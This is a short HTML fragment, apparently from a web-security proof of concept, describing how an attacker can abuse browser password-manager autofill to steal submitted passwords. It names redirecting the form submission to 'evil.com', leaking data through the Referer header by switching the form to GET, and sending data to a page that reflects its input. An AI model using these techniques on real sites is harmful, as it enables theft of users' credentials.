<!-- this will fool password managers -->
<html>

The attacker can utilize built in password manager function in combination with other extraction techniques to get the password and other sensitive data submitted.<br>
Here we are using href redefining to target submission to the evil.com<br>
Depending on the specific site and browser used - attacker can use either these direct techiques or by using:<br>
1. changing method of the form to GET and submission to the same site while getting the response via external Referer (sensistive data will leak this way)<br>
2. redirecting the submission to the same site but another page which is know to reflect the input parameters on the page<br>
these scenarios are quite complicated but sometimes there is no obvious choice :)<br>
